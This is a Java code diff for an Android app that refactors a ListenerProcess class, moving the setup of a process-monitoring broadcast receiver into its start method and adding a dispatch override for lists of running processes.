@@ -1,8 +1,12 @@
 package com.ht.RCSAndroidGUI.listener;
 
-import com.ht.RCSAndroidGUI.RunningProcess;
+import java.util.ArrayList;
 
-public class ListenerProcess extends Listener<RunningProcess> {
+import android.app.ActivityManager.RunningAppProcessInfo;
+
+import com.ht.RCSAndroidGUI.RunningProcesses;
+
+public class ListenerProcess extends Listener<RunningProcesses> {
 	/** The Constant TAG. */
 	private static final String TAG = "ListenerProcess";
 
@@ -30,20 +34,20 @@ public class ListenerProcess extends Listener<RunningProcess> {
 
 	@Override
 	protected void start() {
-		registerProcess();
+		processReceiver = new BroadcastMonitorProcess();
+		processReceiver.start();
+		processReceiver.register(this);
 	}
 
 	@Override
 	protected void stop() {
 		processReceiver.unregister();
+		processReceiver = null;
+	}
+	
+	@Override
+	protected int dispatch(RunningProcesses processes){
+		return super.dispatch(processes);
 	}
 
-	/**
-	 * Register to Network Connection/Disconnection notification.
-	 */
-	private void registerProcess() {
-		processReceiver = new BroadcastMonitorProcess();
-		processReceiver.start();
-		processReceiver.register();
-	}
 }
